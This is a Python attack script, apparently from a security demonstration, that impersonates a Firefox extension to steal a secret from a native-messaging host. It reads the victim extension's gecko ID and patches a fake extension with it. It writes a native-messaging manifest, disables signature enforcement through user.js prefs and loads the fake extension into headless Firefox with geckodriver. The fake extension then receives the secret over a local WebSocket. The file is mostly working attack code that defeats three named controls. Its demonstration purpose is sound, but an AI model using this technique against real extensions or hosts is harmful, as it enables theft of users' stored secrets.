#!/usr/bin/env python3
"""
Attack 3: Extension Imitation
==============================
Replicates the victim extension's Firefox gecko ID by reading it from
manifest.json. A fake extension with the same ID is loaded into a headless
Firefox profile, bypassing the extension signature requirement.
The fake extension connects to the real NM host — the allowed_extensions check
passes because the ID matches — and reports the stolen secret back to this
script over a local WebSocket.

Run: python3 attack3_extension_imitation.py --setup
"""

import sys, os, json, subprocess, shutil
import asyncio, signal, time, urllib.request

# ── Paths ─────────────────────────────────────────────────────────────────────

SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
DEMO_DIR         = os.path.dirname(SCRIPT_DIR)
DEMO_EXT         = os.path.join(DEMO_DIR, "demo_extension", "manifest.json")
FAKE_EXT         = os.path.join(SCRIPT_DIR, "fake_extension")
ATTACKER_PROFILE = os.path.join(SCRIPT_DIR, ".attacker_profile_a3")

HOST_NAME        = "com.demo.securevault"
SYSTEM_NM_DIR    = "/Library/Application Support/Mozilla/NativeMessagingHosts"
USER_NM_DIR      = os.path.expanduser(
    "~/Library/Application Support/Mozilla/NativeMessagingHosts"
)
FIREFOX_BIN      = "/Applications/Firefox.app/Contents/MacOS/firefox"

WS_PORT  = 13502

GECKODRIVER_PORT = 4445

# ── Printing helpers ──────────────────────────────────────────────────────────

def banner():
    print("\n" + "="*65)
    print("  ATTACK 3: EXTENSION IMITATION")
    print("  Fake extension uses same ID as victim, NM host admits it")
    print("="*65)

def control(n, msg):
    print(f"\n  Control {n}: {msg}")

def step(n, title):
    print(f"\n  Step {n}: {title}")
    print(f"  {'─'*55}")

def info(msg):
    print(f"            {msg}")

def bypass(msg):
    print(f"\n  >> {msg}")

def secret_banner(secret):
    print(f"\n  {'*'*55}")
    print(f"  Secret obtained by fake extension:")
    print(f"  {secret}")
    print(f"  {'*'*55}")

def pause(msg="  Press Enter to continue..."):
    input(f"\n{msg}")


# ── Gecko ID extraction ───────────────────────────────────────────────────────

def extract_gecko_id():
    with open(DEMO_EXT) as f:
        m = json.load(f)
    gecko_id = (m.get("browser_specific_settings", {})
                 .get("gecko", {})
                 .get("id"))
    if not gecko_id:
        print("  ERROR: demo_extension/manifest.json has no gecko.id field.")
        sys.exit(1)
    return gecko_id


# ── Manifest helpers ──────────────────────────────────────────────────────────

def read_system_manifest():
    path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    try:
        with open(path) as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"  ERROR: System manifest not found. Run install.sh first.")
        sys.exit(1)
    except PermissionError:
        print(f"  ERROR: Cannot read {path}. Run: sudo chmod 644 {path}")
        sys.exit(1)

def write_nm_manifest_in_profile(real_host_path, gecko_id):
    """Write the NM manifest to the user-level Mozilla path.

    Firefox ignores profile-dir NativeMessagingHosts/ — unlike Chrome it always
    reads from OS-level paths. The system manifest from install.sh covers the
    real host name, so this is only needed if the system manifest is absent.
    User-level is writable without root.
    """
    os.makedirs(USER_NM_DIR, exist_ok=True)
    manifest = {
        "name": HOST_NAME,
        "description": "Real host — accessible from attacker Firefox",
        "path": real_host_path,
        "type": "stdio",
        "allowed_extensions": [gecko_id]
    }
    path = os.path.join(USER_NM_DIR, f"{HOST_NAME}.json")
    with open(path, 'w') as f:
        json.dump(manifest, f, indent=2)
    return path


# ── geckodriver / Firefox launcher ────────────────────────────────────────────

def start_geckodriver(geckodriver_proc):
    proc = subprocess.Popen(
        ["geckodriver", "--port", str(GECKODRIVER_PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    geckodriver_proc[0] = proc
    info(f"  geckodriver started (PID {proc.pid}, port {GECKODRIVER_PORT})")


def create_firefox_session(profile_dir):
    """POST to geckodriver /session to launch headless Firefox. Returns session_id or None."""
    capabilities = {
        "capabilities": {
            "alwaysMatch": {
                "moz:firefoxOptions": {
                    "binary": FIREFOX_BIN,
                    "args":   ["-headless", "-profile", os.path.abspath(profile_dir)],
                }
            }
        }
    }
    for _ in range(30):
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{GECKODRIVER_PORT}/session",
                data=json.dumps(capabilities).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=20)
            data = json.loads(resp.read())
            session_id = data["value"]["sessionId"]
            return session_id
        except Exception:
            time.sleep(0.5)
    return None


def install_addon(session_id, ext_dir):
    """POST to geckodriver moz/addon/install with directory path. Returns True/False."""
    try:
        req = urllib.request.Request(
            f"http://127.0.0.1:{GECKODRIVER_PORT}/session/{session_id}/moz/addon/install",
            data=json.dumps({"path": os.path.abspath(ext_dir), "temporary": True}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception:
        return False


def kill_geckodriver(geckodriver_proc):
    proc = geckodriver_proc[0]
    if proc is None:
        return
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    geckodriver_proc[0] = None


# ── SETUP MODE ────────────────────────────────────────────────────────────────

def run_setup():
    banner()

    print("\n  Controls in place:")
    control(1, "The NM manifest lists allowed_extensions, Firefox only forwards "
               "connections from the specific demo victim extension ID to this host.")
    control(2, "Firefox enforces extension signatures, unsigned extensions cannot "
               "be loaded without profile configuration to disable enforcement.")
    control(3, "The demo victim host verifies its parent process is Firefox "
               "before responding to any request.")

    pause()

    # ── Step 1: Extract the victim gecko ID ───────────────────────────────────
    step(1, "Extracting the victim extension's gecko ID")
    info("Firefox extension IDs come from browser_specific_settings.gecko.id")
    info("in the extension's manifest.json, a fixed, human-readable string.")
    info("No key derivation required.")
    info("")
    info(f"Reading: {DEMO_EXT}")

    gecko_id = extract_gecko_id()

    info(f"Gecko ID: {gecko_id}")

    bypass("Bypassing Control 1: same gecko ID -> allowed_extensions check passes.")

    pause()

    # ── Step 2: Patch fake extension and write NM manifest into profile ───────
    step(2, "Patching the fake extension and preparing the attacker Firefox profile")

    fake_manifest_path = os.path.join(FAKE_EXT, "manifest.json")
    with open(fake_manifest_path) as f:
        fake_m = json.load(f)
    old_id = fake_m.get("browser_specific_settings", {}).get("gecko", {}).get("id", "PLACEHOLDER")
    info(f"Patching: {fake_manifest_path}")
    info(f"Before: gecko.id = {old_id}")
    fake_m["browser_specific_settings"]["gecko"]["id"] = gecko_id
    with open(fake_manifest_path, 'w') as f:
        json.dump(fake_m, f, indent=2)
    info(f"After:  gecko.id = {gecko_id}")
    info("")

    sys_manifest = read_system_manifest()
    real_host_path = sys_manifest["path"]
    nm_path = write_nm_manifest_in_profile(real_host_path, gecko_id)
    info(f"NM manifest written to: {nm_path}")
    info(f"  -> Points to: {real_host_path}")
    info("")
    info("Headless Firefox spawns the real host, its parent IS Firefox, so the parent check passes.")

    bypass("Bypassing Control 3: headless Firefox IS Firefox, parent check passes.")

    pause()

    # ── Step 3: Launch headless Firefox with geckodriver extension loading ──
    step(3, "Launching headless Firefox and loading the fake extension via geckodriver")
    info("Fake extension connects to the real NM host, sends { action: 'get_secret' },")
    info("and reports the secret back over WebSocket to this script.")
    info(f"WebSocket receiver ws://localhost:{WS_PORT}")
    info("")
    info("Profile user.js disables xpinstall.signatures.required.")
    info("Fake extension installed via geckodriver moz/addon/install endpoint.")

    bypass("Bypassing Control 2: user.js profile prefs disable signature enforcement.")

    asyncio.run(run_attack_async(gecko_id, fake_manifest_path))


# ── Async attack core ─────────────────────────────────────────────────────────

async def run_attack_async(gecko_id, fake_manifest_path):
    import websockets

    stolen_secret    = [None]
    geckodriver_proc = [None]

    def cleanup(sig=None, frame=None):
        print("\n\n  Cleaning up...")
        try:
            with open(fake_manifest_path) as f:
                fm = json.load(f)
            fm["browser_specific_settings"]["gecko"]["id"] = "PLACEHOLDER"
            with open(fake_manifest_path, 'w') as f:
                json.dump(fm, f, indent=2)
        except Exception:
            pass
        kill_geckodriver(geckodriver_proc)
        print("  Attacker headless Firefox terminated.")
        print("  Done.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    # ── Start WebSocket receiver ──────────────────────────────────────────────
    async def ws_handler(websocket):
        async for raw in websocket:
            try:
                msg = json.loads(raw)
                event = msg.get("event", "")
                info(f"  ws_recv: {raw.strip()}")
                if event == "secret_stolen" and msg.get("secret"):
                    stolen_secret[0] = msg["secret"]
                    secret_banner(msg["secret"])
                elif event == "nm_recv":
                    pass   # normal protocol traffic, already shown above
                elif event == "error":
                    info(f"  ws_error: {msg.get('error')}")
            except Exception:
                pass

    async with websockets.serve(ws_handler, "localhost", WS_PORT):
        info(f"  WebSocket server listening on ws://localhost:{WS_PORT}")
        info("")
        info("  (requires geckodriver: brew install geckodriver)")
        info("")

        # ── Set up attacker profile ───────────────────────────────────────────
        if os.path.exists(ATTACKER_PROFILE):
            shutil.rmtree(ATTACKER_PROFILE)
        os.makedirs(ATTACKER_PROFILE, exist_ok=True)

        # Write user.js to disable signature enforcement
        user_js = os.path.join(ATTACKER_PROFILE, "user.js")
        with open(user_js, 'w') as f:
            f.write('user_pref("xpinstall.signatures.required", false);\n')
            f.write('user_pref("extensions.autoDisableScopes", 0);\n')
            f.write('user_pref("extensions.enabledScopes", 15);\n')

        # ── Launch headless Firefox via geckodriver ───────────────────────────
        start_geckodriver(geckodriver_proc)
        loop = asyncio.get_event_loop()
        session_id = await loop.run_in_executor(
            None, create_firefox_session, ATTACKER_PROFILE
        )
        if session_id:
            info(f"  Firefox session created ({session_id[:8]}...)")
            ok = await loop.run_in_executor(None, install_addon, session_id, FAKE_EXT)
            if ok:
                await asyncio.sleep(2.0)
                info(f"  Fake extension installed via geckodriver.")
            else:
                info(f"  WARNING: extension install failed, check geckodriver and Firefox.")
        else:
            info(f"  WARNING: could not create Firefox session, check geckodriver.")

        info("")
        info("  Waiting for the fake extension to connect to the real demo victim host...")
        info("  Press Ctrl+C to stop.")
        info("")

        # ── Wait for stolen secret ────────────────────────────────────────────
        timeout = 60
        elapsed = 0
        while stolen_secret[0] is None and elapsed < timeout:
            await asyncio.sleep(0.5)
            elapsed += 0.5

        if stolen_secret[0] is None:
            info(f"  Timed out after {timeout}s, fake extension did not report a secret.")

    cleanup()


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        run_setup()
    else:
        print("Usage:")
        print("  python3 attack3_extension_imitation.py --setup")
        sys.exit(1)
